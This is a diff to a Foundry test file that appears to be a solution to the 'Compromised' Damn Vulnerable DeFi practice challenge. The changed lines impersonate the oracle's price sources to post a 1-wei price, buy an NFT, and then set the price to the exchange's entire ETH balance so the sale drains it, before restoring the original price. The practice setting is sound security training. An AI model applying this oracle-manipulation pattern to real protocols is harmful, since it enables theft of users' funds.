@@ -82,12 +82,11 @@ contract Compromised is Test {
         trustfulOracle.postPrice("DVNFT", 1 wei);
         vm.startPrank(attacker);
         exchange.buyOne{value: 1 wei}();
-        exchange.buyOne{value: 1 wei}();
         vm.stopPrank();
         vm.prank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
-        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1 wei);
         vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
-        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1 wei);
         vm.startPrank(attacker);
         uint256 i = 0;
         for (i; i < damnValuableNFT.balanceOf(attacker); i++) {
@@ -96,10 +95,13 @@ contract Compromised is Test {
             }
         }
         damnValuableNFT.approve(address(exchange), 0);
-        damnValuableNFT.approve(address(exchange), 1);
         exchange.sellOne(0);
-        exchange.sellOne(1);
         vm.stopPrank();
+        vm.prank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
         /** EXPLOIT END **/
         validation();
     }
